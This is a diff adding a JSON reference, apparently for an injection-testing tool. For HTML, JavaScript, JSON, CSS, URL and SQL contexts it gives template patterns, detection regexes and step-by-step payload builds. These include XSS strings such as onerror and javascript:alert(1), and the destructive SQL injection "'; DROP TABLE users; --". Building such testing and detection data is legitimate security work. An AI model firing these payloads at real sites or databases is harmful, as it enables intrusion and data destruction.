@@ -1,0 +1,1962 @@
+{
+  "injection_contexts": {
+    "html": {
+      "html_body_content": {
+        "context_patterns": [
+          "<div>USER_INPUT</div>",
+          "<p>USER_INPUT</p>",
+          "<span>USER_INPUT</span>",
+          "<h1>USER_INPUT</h1>",
+          "<h2>USER_INPUT</h2>",
+          "<h3>USER_INPUT</h3>",
+          "<li>USER_INPUT</li>",
+          "<td>USER_INPUT</td>",
+          "<th>USER_INPUT</th>",
+          "<label>USER_INPUT</label>",
+          "<button>USER_INPUT</button>",
+          "<a>USER_INPUT</a>",
+          "<strong>USER_INPUT</strong>",
+          "<em>USER_INPUT</em>",
+          "<b>USER_INPUT</b>",
+          "<i>USER_INPUT</i>",
+          "<small>USER_INPUT</small>",
+          "<pre>USER_INPUT</pre>",
+          "<code>USER_INPUT</code>",
+          "<textarea>USER_INPUT</textarea>"
+        ],
+        "detection_regex": "<\\w+[^>]*>\\s*USER_INPUT\\s*</\\w+>",
+        "structural_requirements": {
+          "escape": "Not needed (already in HTML context)",
+          "structure": "Valid HTML tags or text",
+          "payload": "HTML tags with event handlers or script tags",
+          "cleanup": "Close any opened tags"
+        },
+        "structures": {
+          "auto_firing": [
+            "onerror",
+            "onload",
+            "onfocus",
+            "onanimationstart",
+            "onpageshow"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "onmouseenter",
+            "onkeypress",
+            "ondblclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "<img",
+          "step_3": "<img src=x",
+          "step_4": "<img src=x onerror=",
+          "step_5": "<img src=x onerror=alert(1)",
+          "step_6": "<img src=x onerror=alert(1)>"
+        }
+      },
+      "html_attribute_values": {
+        "context_patterns": [
+          "<input value=\"USER_INPUT\">",
+          "<img src=\"USER_INPUT\">",
+          "<a href=\"USER_INPUT\">",
+          "<input type=\"text\" value=\"USER_INPUT\">",
+          "<input placeholder=\"USER_INPUT\">",
+          "<img alt=\"USER_INPUT\">",
+          "<img title=\"USER_INPUT\">",
+          "<div class=\"USER_INPUT\">",
+          "<div id=\"USER_INPUT\">",
+          "<div data-value=\"USER_INPUT\">",
+          "<div style=\"color: red; background: USER_INPUT;\">",
+          "<form action=\"USER_INPUT\">",
+          "<iframe src=\"USER_INPUT\">",
+          "<script src=\"USER_INPUT\">",
+          "<link href=\"USER_INPUT\">",
+          "<meta content=\"USER_INPUT\">",
+          "<input name=\"USER_INPUT\">",
+          "<div role=\"USER_INPUT\">",
+          "<div aria-label=\"USER_INPUT\">",
+          "<input value='USER_INPUT'>",
+          "<img src='USER_INPUT'>",
+          "<div class='USER_INPUT'>"
+        ],
+        "detection_regex": "<\\w+[^>]*\\w+\\s*=\\s*[\"']USER_INPUT[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "\" or ' (close current attribute)",
+          "structure": "Space + new attribute name",
+          "payload": "Event handler with JavaScript",
+          "cleanup": "\" or ' (close your attribute)"
+        },
+        "structures": {
+          "auto_firing": [
+            "autofocus",
+            "onerror",
+            "onload",
+            "onfocus",
+            "onanimationstart"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "onmouseenter",
+            "onkeydown",
+            "onmouseout"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\" onmouseover=",
+          "step_4": "\" onmouseover=\"alert(1)",
+          "step_5": "\" onmouseover=\"alert(1)\"",
+          "step_6": "\" onmouseover=\"alert(1)\" x=\""
+        }
+      },
+      "html_attribute_names": {
+        "context_patterns": [
+          "<div USER_INPUT=\"value\">",
+          "<img USER_INPUT=\"test\">",
+          "<input USER_INPUT=\"data\">",
+          "<span USER_INPUT=\"info\">",
+          "<button USER_INPUT=\"action\">",
+          "<form USER_INPUT=\"submit\">",
+          "<textarea USER_INPUT=\"content\">",
+          "<select USER_INPUT=\"option\">",
+          "<table USER_INPUT=\"data\">",
+          "<div USER_INPUT='value'>",
+          "<img USER_INPUT='test'>"
+        ],
+        "detection_regex": "<\\w+[^>]*\\s+USER_INPUT\\s*=\\s*[\"'][^\"']*[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "Space (separate from previous attribute)",
+          "structure": "Valid attribute name",
+          "payload": "Event handler attribute",
+          "cleanup": "=\" + dummy value"
+        },
+        "structures": {
+          "auto_firing": [
+            "onload",
+            "onerror",
+            "onfocus",
+            "onpageshow",
+            "onanimationstart"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "onmouseenter",
+            "onkeypress",
+            "ondblclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "onmouseover",
+          "step_3": "onmouseover=",
+          "step_4": "onmouseover=\"alert(1)",
+          "step_5": "onmouseover=\"alert(1)\""
+        }
+      },
+      "html_comments": {
+        "context_patterns": [
+          "<!-- USER_INPUT -->",
+          "<!-- Comment: USER_INPUT -->",
+          "<!-- Debug: USER_INPUT -->",
+          "<!-- TODO: USER_INPUT -->",
+          "<!-- Note: USER_INPUT -->",
+          "<!-- USER_INPUT - end -->",
+          "<!--USER_INPUT-->",
+          "<!-- Begin USER_INPUT -->",
+          "<!-- Error: USER_INPUT -->",
+          "<!-- Config: USER_INPUT -->"
+        ],
+        "detection_regex": "<!--[^>]*USER_INPUT[^>]*-->",
+        "structural_requirements": {
+          "escape": "--> (close comment)",
+          "structure": "Valid HTML after comment",
+          "payload": "Script tags or event handlers",
+          "cleanup": "<!-- (open new comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "script",
+            "img",
+            "svg",
+            "iframe",
+            "body"
+          ],
+          "manual_interaction": [
+            "div",
+            "button",
+            "a",
+            "input",
+            "span"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "-->",
+          "step_3": "--><script>",
+          "step_4": "--><script>alert(1)",
+          "step_5": "--><script>alert(1)</script>",
+          "step_6": "--><script>alert(1)</script><!--"
+        }
+      }
+    },
+    "javascript": {
+      "javascript_string_literals": {
+        "context_patterns": [
+          "<script>var data = \"USER_INPUT\";</script>",
+          "<script>var msg = 'USER_INPUT';</script>",
+          "<script>const value = \"USER_INPUT\";</script>",
+          "<script>let text = 'USER_INPUT';</script>",
+          "<script>var config = {message: \"USER_INPUT\"};</script>",
+          "<script>function test() { return \"USER_INPUT\"; }</script>",
+          "<script>console.log(\"USER_INPUT\");</script>",
+          "<script>alert(\"USER_INPUT\");</script>",
+          "<script>document.write(\"USER_INPUT\");</script>",
+          "<script>var x = 'USER_INPUT', y = 'other';</script>",
+          "<script>if (name === \"USER_INPUT\") {}</script>",
+          "<script>window.location = \"USER_INPUT\";</script>",
+          "var data = \"USER_INPUT\";",
+          "const msg = 'USER_INPUT';",
+          "let value = \"USER_INPUT\";",
+          "return \"USER_INPUT\";",
+          "throw new Error(\"USER_INPUT\");",
+          "eval(\"USER_INPUT\");"
+        ],
+        "detection_regex": "(var|let|const|return|throw|eval|console\\.log|alert|document\\.write)\\s*[\\(\\s]*[\"']USER_INPUT[\"']",
+        "structural_requirements": {
+          "escape": "\" or ' (close string)",
+          "structure": "; (end statement)",
+          "payload": "Valid JavaScript",
+          "cleanup": ";// or /**/ (comment out rest)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "document.write",
+            "window.location",
+            "setTimeout"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "document.onclick",
+            "addEventListener"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\";",
+          "step_4": "\";alert(1)",
+          "step_5": "\";alert(1);",
+          "step_6": "\";alert(1);//"
+        }
+      },
+      "javascript_function_parameters": {
+        "context_patterns": [
+          "<script>someFunction(\"USER_INPUT\");</script>",
+          "<script>callback('USER_INPUT');</script>",
+          "<script>console.log(\"USER_INPUT\", other);</script>",
+          "<script>alert(\"USER_INPUT\");</script>",
+          "<script>eval(\"USER_INPUT\");</script>",
+          "<script>setTimeout(\"USER_INPUT\", 1000);</script>",
+          "<script>setInterval('USER_INPUT', 100);</script>",
+          "<script>fetch(\"USER_INPUT\");</script>",
+          "<script>$.ajax({url: \"USER_INPUT\"});</script>",
+          "<script>window.open(\"USER_INPUT\");</script>",
+          "<script>document.getElementById(\"USER_INPUT\");</script>",
+          "<script>myFunc(\"USER_INPUT\", \"param2\");</script>",
+          "someFunction(\"USER_INPUT\");",
+          "callback('USER_INPUT');",
+          "console.log(\"USER_INPUT\");",
+          "alert('USER_INPUT');",
+          "setTimeout(\"USER_INPUT\", 1000);"
+        ],
+        "detection_regex": "\\w+\\s*\\(\\s*[\"']USER_INPUT[\"']",
+        "structural_requirements": {
+          "escape": "\" (close parameter)",
+          "structure": ") (close function call)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "document.write",
+            "setTimeout",
+            "setInterval"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "document.onclick",
+            "addEventListener"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\")",
+          "step_4": "\");",
+          "step_5": "\");alert(1)",
+          "step_6": "\");alert(1);//"
+        }
+      },
+      "javascript_object_properties": {
+        "context_patterns": [
+          "<script>var obj = {prop: \"USER_INPUT\"};</script>",
+          "<script>config = {data: 'USER_INPUT'};</script>",
+          "<script>var settings = {name: \"USER_INPUT\", id: 123};</script>",
+          "<script>const user = {email: \"USER_INPUT\"};</script>",
+          "<script>let options = {value: 'USER_INPUT'};</script>",
+          "<script>var json = {message: \"USER_INPUT\", type: \"info\"};</script>",
+          "<script>window.config = {api: \"USER_INPUT\"};</script>",
+          "<script>$.extend({url: \"USER_INPUT\"});</script>",
+          "var obj = {prop: \"USER_INPUT\"};",
+          "config = {data: 'USER_INPUT'};",
+          "const settings = {name: \"USER_INPUT\"};",
+          "let options = {value: 'USER_INPUT'};",
+          "{message: \"USER_INPUT\", status: 200}",
+          "{\"data\": \"USER_INPUT\", \"success\": true}"
+        ],
+        "detection_regex": "\\{[^}]*\\w+\\s*:\\s*[\"']USER_INPUT[\"'][^}]*\\}",
+        "structural_requirements": {
+          "escape": "\" (close property value)",
+          "structure": "} (close object)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "document.write",
+            "location",
+            "setTimeout"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "onclick",
+            "document.onclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"}",
+          "step_4": "\"};",
+          "step_5": "\"};alert(1)",
+          "step_6": "\"};alert(1);//"
+        }
+      },
+      "javascript_comments": {
+        "context_patterns": [
+          "<script>// USER_INPUT\nvar x = 1;</script>",
+          "<script>/* USER_INPUT */ var y = 2;</script>",
+          "<script>// Debug: USER_INPUT\nconsole.log('test');</script>",
+          "<script>/* Config: USER_INPUT */</script>",
+          "<script>// TODO: USER_INPUT</script>",
+          "<script>/* Error: USER_INPUT\n   Additional context */</script>",
+          "// USER_INPUT\nvar x = 1;",
+          "/* USER_INPUT */ var y = 2;",
+          "// Debug: USER_INPUT",
+          "/* Config: USER_INPUT */",
+          "// TODO: USER_INPUT",
+          "/* Note: USER_INPUT */"
+        ],
+        "detection_regex": "(//[^\\n\\r]*USER_INPUT[^\\n\\r]*|/\\*[^*]*USER_INPUT[^*]*\\*/)",
+        "structural_requirements": {
+          "escape": "\\n or \\r (newline) or */ (close comment)",
+          "structure": "Valid JavaScript line",
+          "payload": "JavaScript code",
+          "cleanup": "// (new comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "document.write",
+            "window.location",
+            "setTimeout"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "document.onclick",
+            "onclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\\n",
+          "step_3": "\\nalert(1)",
+          "step_4": "\\nalert(1);//"
+        }
+      }
+    },
+    "json": {
+      "json_string_values": {
+        "context_patterns": [
+          "<script>var config = {\"name\": \"USER_INPUT\"};</script>",
+          "var data = {\"message\": \"USER_INPUT\", \"type\": \"info\"};",
+          "<script>const user = {\"email\": \"USER_INPUT\"};</script>",
+          "<script>let settings = {\"value\": \"USER_INPUT\", \"enabled\": true};</script>",
+          "<script>window.config = {\"api_key\": \"USER_INPUT\"};</script>",
+          "<script>var json = {\"title\": \"USER_INPUT\", \"id\": 123};</script>",
+          "{\"name\": \"USER_INPUT\"}",
+          "{\"message\": \"USER_INPUT\", \"type\": \"info\"}",
+          "{\"data\": {\"value\": \"USER_INPUT\"}}",
+          "{\"user\": {\"name\": \"USER_INPUT\", \"role\": \"admin\"}}",
+          "{\"config\": {\"setting\": \"USER_INPUT\"}}",
+          "{\"response\": {\"text\": \"USER_INPUT\", \"status\": 200}}",
+          "var obj = {\"prop\": \"USER_INPUT\"};",
+          "const data = {\"field\": \"USER_INPUT\"};",
+          "let config = {\"option\": \"USER_INPUT\"};"
+        ],
+        "detection_regex": "\\{[^}]*[\"']\\w+[\"']\\s*:\\s*[\"']USER_INPUT[\"'][^}]*\\}",
+        "structural_requirements": {
+          "escape": "\" (close string value)",
+          "structure": ", (property separator)",
+          "payload": "\"prop\":\"value\" (new property)",
+          "cleanup": "};// (close object + comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "location",
+            "document.write",
+            "setTimeout"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "onclick",
+            "document.body.onclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\",",
+          "step_4": "\",\"newprop\":",
+          "step_5": "\",\"newprop\":\"value\"",
+          "step_6": "\",\"newprop\":\"value\"}",
+          "step_7": "\",\"newprop\":\"value\"};//"
+        }
+      },
+      "json_object_properties": {
+        "context_patterns": [
+          "<script>var config = {USER_INPUT: \"value\"};</script>",
+          "var obj = {USER_INPUT: 123};",
+          "<script>const data = {USER_INPUT: \"test\", other: \"value\"};</script>",
+          "<script>let settings = {USER_INPUT: true};</script>",
+          "{USER_INPUT: \"value\"}",
+          "{USER_INPUT: 123, other: \"test\"}",
+          "{\"USER_INPUT\": \"value\"}",
+          "{'USER_INPUT': \"value\"}",
+          "var config = {USER_INPUT: \"data\"};",
+          "const obj = {USER_INPUT: false};",
+          "let data = {USER_INPUT: null};"
+        ],
+        "detection_regex": "\\{[^}]*[\"']?USER_INPUT[\"']?\\s*:\\s*[^,}]+[^}]*\\}",
+        "structural_requirements": {
+          "escape": "Not needed (already property name)",
+          "structure": ": + property value",
+          "payload": "Valid JSON value or break structure",
+          "cleanup": ", or } depending on approach"
+        },
+        "structures": {
+          "auto_firing": [
+            "__proto__",
+            "constructor",
+            "prototype",
+            "valueOf",
+            "toString"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "name",
+            "value",
+            "data"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"test\"",
+          "step_3": "\"test\":",
+          "step_4": "\"test\":\"value\"",
+          "step_5": "\"test\":\"value\",\"xss\":\"alert(1)\""
+        }
+      },
+      "json_array_elements": {
+        "context_patterns": [
+          "<script>var arr = [\"item1\", \"USER_INPUT\", \"item3\"];</script>",
+          "var list = [1, \"USER_INPUT\", true];",
+          "<script>const data = [\"USER_INPUT\"];</script>",
+          "<script>let items = [\"first\", \"USER_INPUT\", \"last\"];</script>",
+          "[\"item1\", \"USER_INPUT\", \"item3\"]",
+          "[1, \"USER_INPUT\", true]",
+          "[\"USER_INPUT\"]",
+          "[\"first\", \"USER_INPUT\", \"last\"]",
+          "var array = [\"USER_INPUT\", \"other\"];",
+          "const list = [\"data\", \"USER_INPUT\"];",
+          "let items = [\"USER_INPUT\", 123, false];",
+          "[{\"name\": \"USER_INPUT\"}, {\"id\": 123}]",
+          "[\"USER_INPUT\", {\"type\": \"object\"}]"
+        ],
+        "detection_regex": "\\[[^\\]]*[\"']USER_INPUT[\"'][^\\]]*\\]",
+        "structural_requirements": {
+          "escape": "\" (close string element)",
+          "structure": "] (close array)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "document.write",
+            "location.href",
+            "setTimeout"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "onclick",
+            "document.body.onclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"]",
+          "step_4": "\"];",
+          "step_5": "\"];alert(1)",
+          "step_6": "\"];alert(1);//"
+        }
+      },
+      "jsonp_callbacks": {
+        "context_patterns": [
+          "<script>callback({\"data\": \"USER_INPUT\"});</script>",
+          "jsonp_response({\"result\": \"USER_INPUT\"});",
+          "<script>window.callback({\"message\": \"USER_INPUT\"});</script>",
+          "<script>jQuery123456789({\"value\": \"USER_INPUT\"});</script>",
+          "<script>angular.callbacks._0({\"text\": \"USER_INPUT\"});</script>",
+          "callback({\"data\": \"USER_INPUT\"});",
+          "jsonp_response({\"result\": \"USER_INPUT\"});",
+          "window.callback({\"message\": \"USER_INPUT\"});",
+          "jQuery123456789({\"value\": \"USER_INPUT\"});",
+          "angular.callbacks._0({\"text\": \"USER_INPUT\"});",
+          "mycallback({\"response\": \"USER_INPUT\"});",
+          "success({\"data\": \"USER_INPUT\", \"status\": \"ok\"});",
+          "handleResponse({\"content\": \"USER_INPUT\"})"
+        ],
+        "detection_regex": "\\w+\\s*\\(\\s*\\{[^}]*[\"']\\w+[\"']\\s*:\\s*[\"']USER_INPUT[\"'][^}]*\\}\\s*\\)",
+        "structural_requirements": {
+          "escape": "\" (close string)",
+          "structure": "}) (close callback)",
+          "payload": "; + JavaScript",
+          "cleanup": ";// (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "alert",
+            "eval",
+            "document.write",
+            "location",
+            "setTimeout"
+          ],
+          "manual_interaction": [
+            "confirm",
+            "prompt",
+            "console.log",
+            "onclick",
+            "document.onclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"});",
+          "step_4": "\"});alert(1)",
+          "step_5": "\"});alert(1);//"
+        }
+      }
+    },
+    "css": {
+      "css_property_values": {
+        "context_patterns": [
+          "<div style=\"color: USER_INPUT\">",
+          "<span style=\"background: USER_INPUT;\">",
+          "<div style=\"font-size: USER_INPUT;\">",
+          "<p style=\"margin: USER_INPUT;\">",
+          "<img style=\"width: USER_INPUT;\">",
+          "<div style=\"height: USER_INPUT; color: red;\">",
+          "<span style=\"border: 1px solid USER_INPUT;\">",
+          "<div style=\"background-color: USER_INPUT;\">",
+          "<p style=\"font-family: USER_INPUT;\">",
+          "<div style=\"padding: USER_INPUT;\">",
+          "<span style=\"text-decoration: USER_INPUT;\">",
+          "<div style=\"position: USER_INPUT;\">",
+          "<p style=\"display: USER_INPUT;\">",
+          "<div style=\"float: USER_INPUT;\">",
+          "<span style=\"cursor: USER_INPUT;\">"
+        ],
+        "detection_regex": "style\\s*=\\s*[\"'][^\"']*\\w+\\s*:\\s*[^;\"']*USER_INPUT[^;\"']*[;\"']",
+        "structural_requirements": {
+          "escape": "Not always needed",
+          "structure": "; (end property)",
+          "payload": "New CSS property or CSS function",
+          "cleanup": "; (end your property)"
+        },
+        "structures": {
+          "auto_firing": [
+            "background",
+            "background-image",
+            "list-style",
+            "list-style-image",
+            "cursor"
+          ],
+          "manual_interaction": [
+            "content",
+            "border-image",
+            "mask",
+            "mask-image",
+            "filter"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "red",
+          "step_2": "red;",
+          "step_3": "red;background:",
+          "step_4": "red;background:url(javascript:alert(1))",
+          "step_5": "red;background:url(javascript:alert(1));"
+        }
+      },
+      "css_style_blocks": {
+        "context_patterns": [
+          "<style>.class { color: USER_INPUT; }</style>",
+          "<style>body { font-size: USER_INPUT; }</style>",
+          "<style>#id { background: USER_INPUT; }</style>",
+          "<style>div { margin: USER_INPUT; }</style>",
+          "<style>p { padding: USER_INPUT; }</style>",
+          "<style>.container { width: USER_INPUT; }</style>",
+          "<style>h1 { border: USER_INPUT; }</style>",
+          "<style>span { height: USER_INPUT; }</style>",
+          "<style>img { opacity: USER_INPUT; }</style>",
+          "<style>a { text-decoration: USER_INPUT; }</style>",
+          "<style>table { border-collapse: USER_INPUT; }</style>",
+          "<style>input { outline: USER_INPUT; }</style>"
+        ],
+        "detection_regex": "<style[^>]*>[^<]*[^{]*\\{[^}]*\\w+\\s*:\\s*[^;}]*USER_INPUT[^;}]*[;}][^}]*\\}[^<]*</style>",
+        "structural_requirements": {
+          "escape": "Not needed initially",
+          "structure": "} (close current rule)",
+          "payload": "New CSS rule",
+          "cleanup": "Close any opened rules"
+        },
+        "structures": {
+          "auto_firing": [
+            "body",
+            "html",
+            "*",
+            "div",
+            "img"
+          ],
+          "manual_interaction": [
+            "a:hover",
+            "input:focus",
+            "button:active",
+            "div:hover",
+            "span:focus"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "red",
+          "step_2": "red;}",
+          "step_3": "red;}body{",
+          "step_4": "red;}body{background:url(javascript:alert(1))",
+          "step_5": "red;}body{background:url(javascript:alert(1))}"
+        }
+      },
+      "css_attribute_selectors": {
+        "context_patterns": [
+          "<style>input[value=\"USER_INPUT\"] { }</style>",
+          "<style>div[data-USER_INPUT] { }</style>",
+          "<style>img[alt=\"USER_INPUT\"] { }</style>",
+          "<style>a[href=\"USER_INPUT\"] { }</style>",
+          "<style>input[name=\"USER_INPUT\"] { }</style>",
+          "<style>div[class=\"USER_INPUT\"] { }</style>",
+          "<style>span[id=\"USER_INPUT\"] { }</style>",
+          "<style>form[action=\"USER_INPUT\"] { }</style>",
+          "<style>meta[content=\"USER_INPUT\"] { }</style>",
+          "<style>link[href=\"USER_INPUT\"] { }</style>",
+          "<style>input[placeholder=\"USER_INPUT\"] { }</style>",
+          "<style>div[title=\"USER_INPUT\"] { }</style>"
+        ],
+        "detection_regex": "<style[^>]*>[^<]*\\w+\\[\\w*[\"']?USER_INPUT[\"']?\\w*\\][^{]*\\{[^}]*\\}[^<]*</style>",
+        "structural_requirements": {
+          "escape": "\" (close attribute value)",
+          "structure": "] (close selector)",
+          "payload": "New CSS rule or selector",
+          "cleanup": "Close rule block"
+        },
+        "structures": {
+          "auto_firing": [
+            "background",
+            "background-image",
+            "list-style",
+            "content",
+            "cursor"
+          ],
+          "manual_interaction": [
+            "hover",
+            "focus",
+            "active",
+            "visited",
+            "target"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\"]",
+          "step_4": "\"] { background:url(javascript:alert(1))",
+          "step_5": "\"] { background:url(javascript:alert(1)) }"
+        }
+      }
+    },
+    "url_protocol": {
+      "href_attributes": {
+        "context_patterns": [
+          "<a href=\"USER_INPUT\">",
+          "<area href=\"USER_INPUT\">",
+          "<link href=\"USER_INPUT\">",
+          "<base href=\"USER_INPUT\">",
+          "<a href=\"USER_INPUT\" target=\"_blank\">",
+          "<area href=\"USER_INPUT\" shape=\"rect\">",
+          "<link rel=\"stylesheet\" href=\"USER_INPUT\">",
+          "<a href=\"USER_INPUT\" class=\"link\">",
+          "<area href=\"USER_INPUT\" coords=\"0,0,100,100\">",
+          "<link type=\"text/css\" href=\"USER_INPUT\">",
+          "<a href='USER_INPUT'>",
+          "<area href='USER_INPUT'>",
+          "<link href='USER_INPUT'>"
+        ],
+        "detection_regex": "<(a|area|link|base)\\b[^>]*\\bhref\\s*=\\s*[\"']USER_INPUT[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "Not needed (URL context)",
+          "structure": "Valid URL scheme",
+          "payload": "javascript: protocol",
+          "cleanup": "Not typically needed"
+        },
+        "structures": {
+          "auto_firing": [
+            "javascript",
+            "data",
+            "vbscript",
+            "file",
+            "jar"
+          ],
+          "manual_interaction": [
+            "http",
+            "https",
+            "ftp",
+            "mailto",
+            "tel"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "http://test.com",
+          "step_2": "javascript:",
+          "step_3": "javascript:alert(1)",
+          "step_4": "javascript:alert(1);//"
+        }
+      },
+      "src_attributes": {
+        "context_patterns": [
+          "<img src=\"USER_INPUT\">",
+          "<script src=\"USER_INPUT\">",
+          "<iframe src=\"USER_INPUT\">",
+          "<audio src=\"USER_INPUT\">",
+          "<video src=\"USER_INPUT\">",
+          "<source src=\"USER_INPUT\">",
+          "<track src=\"USER_INPUT\">",
+          "<embed src=\"USER_INPUT\">",
+          "<object data=\"USER_INPUT\">",
+          "<img src=\"USER_INPUT\" alt=\"image\">",
+          "<script type=\"text/javascript\" src=\"USER_INPUT\">",
+          "<iframe src=\"USER_INPUT\" width=\"100\">",
+          "<img src='USER_INPUT'>",
+          "<script src='USER_INPUT'>",
+          "<iframe src='USER_INPUT'>"
+        ],
+        "detection_regex": "<(img|script|iframe|audio|video|source|track|embed)\\b[^>]*\\bsrc\\s*=\\s*[\"']USER_INPUT[\"'][^>]*>|<object\\b[^>]*\\bdata\\s*=\\s*[\"']USER_INPUT[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "\" (if breaking out of attribute)",
+          "structure": "Space + new attribute",
+          "payload": "Event handler",
+          "cleanup": "\" (close attribute)"
+        },
+        "structures": {
+          "auto_firing": [
+            "onerror",
+            "onload",
+            "onfocus",
+            "onanimationstart",
+            "onpageshow"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "onmouseenter",
+            "onkeydown",
+            "ondblclick"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "http://test.com/image.jpg",
+          "step_2": "\"",
+          "step_3": "\" onerror=\"",
+          "step_4": "\" onerror=\"alert(1)",
+          "step_5": "\" onerror=\"alert(1)\""
+        }
+      },
+      "action_attributes": {
+        "context_patterns": [
+          "<form action=\"USER_INPUT\">",
+          "<form method=\"post\" action=\"USER_INPUT\">",
+          "<form action=\"USER_INPUT\" method=\"get\">",
+          "<form enctype=\"multipart/form-data\" action=\"USER_INPUT\">",
+          "<form action=\"USER_INPUT\" target=\"_blank\">",
+          "<form action=\"USER_INPUT\" autocomplete=\"off\">",
+          "<form action=\"USER_INPUT\" novalidate>",
+          "<form action='USER_INPUT'>",
+          "<form method='post' action='USER_INPUT'>"
+        ],
+        "detection_regex": "<form\\b[^>]*\\baction\\s*=\\s*[\"']USER_INPUT[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "\" (close attribute)",
+          "structure": "Space + new attribute or close tag",
+          "payload": "javascript: URL or event handler",
+          "cleanup": "\" (close attribute)"
+        },
+        "structures": {
+          "auto_firing": [
+            "javascript",
+            "data",
+            "vbscript",
+            "onsubmit",
+            "onreset"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "onfocus",
+            "onchange",
+            "oninput"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "/submit",
+          "step_2": "javascript:alert(1)",
+          "step_3": "\" onsubmit=\"alert(1)",
+          "step_4": "\" onsubmit=\"alert(1)\""
+        }
+      }
+    },
+    "sql": {
+      "sql_string_literals": {
+        "context_patterns": [
+          "SELECT * FROM users WHERE name = 'USER_INPUT'",
+          "INSERT INTO table VALUES ('USER_INPUT')",
+          "UPDATE users SET name = 'USER_INPUT' WHERE id = 1",
+          "DELETE FROM users WHERE email = 'USER_INPUT'",
+          "SELECT * FROM products WHERE title LIKE '%USER_INPUT%'",
+          "INSERT INTO logs (message) VALUES ('USER_INPUT')",
+          "UPDATE settings SET value = 'USER_INPUT'",
+          "SELECT COUNT(*) FROM orders WHERE status = 'USER_INPUT'",
+          "INSERT INTO comments (text, user) VALUES ('USER_INPUT', 'admin')",
+          "SELECT * FROM articles WHERE category = 'USER_INPUT'",
+          "UPDATE profiles SET bio = 'USER_INPUT' WHERE user_id = 123",
+          "DELETE FROM sessions WHERE token = 'USER_INPUT'",
+          "SELECT * FROM files WHERE filename = 'USER_INPUT'"
+        ],
+        "detection_regex": "(SELECT|INSERT|UPDATE|DELETE)\\b[^']*'[^']*USER_INPUT[^']*'",
+        "structural_requirements": {
+          "escape": "' (close string)",
+          "structure": "; or SQL operator",
+          "payload": "SQL injection payload",
+          "cleanup": "-- or /**/ (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "OR",
+            "UNION",
+            "WAITFOR",
+            "SLEEP",
+            "BENCHMARK"
+          ],
+          "manual_interaction": [
+            "AND",
+            "HAVING",
+            "GROUP",
+            "ORDER",
+            "WHERE"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "'",
+          "step_3": "';",
+          "step_4": "'; DROP TABLE users;",
+          "step_5": "'; DROP TABLE users; --"
+        }
+      },
+      "sql_numeric_contexts": {
+        "context_patterns": [
+          "SELECT * FROM users WHERE id = USER_INPUT",
+          "UPDATE table SET value = USER_INPUT",
+          "DELETE FROM users WHERE age > USER_INPUT",
+          "SELECT * FROM products WHERE price < USER_INPUT",
+          "INSERT INTO stats (count) VALUES (USER_INPUT)",
+          "UPDATE counters SET value = USER_INPUT WHERE name = 'visits'",
+          "SELECT * FROM orders WHERE total >= USER_INPUT",
+          "DELETE FROM logs WHERE timestamp < USER_INPUT",
+          "SELECT AVG(score) FROM reviews WHERE rating = USER_INPUT",
+          "UPDATE users SET login_count = USER_INPUT",
+          "SELECT * FROM items WHERE quantity != USER_INPUT",
